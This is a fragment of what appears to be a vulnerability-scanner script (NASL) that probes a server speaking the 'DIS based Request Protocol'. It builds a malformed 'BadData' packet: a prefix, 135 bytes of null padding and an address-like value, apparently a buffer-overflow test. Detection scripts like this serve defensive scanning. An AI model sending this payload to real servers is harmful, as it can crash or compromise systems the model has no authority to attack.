...
close( soc );
if(!res || !ContainsString( res, "DIS based Request Protocol MSG=cannot decode message" )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
...
BadData = raw_string( 0x33, 0x31, 0x34, 0x33, 0x31 ) + crap( data: raw_string( 0x00 ), length: 135 ) + raw_string( 0xc0, 0x18, 0x76, 0xf7, 0xff, 0x7f, 0x00, 0x00 );
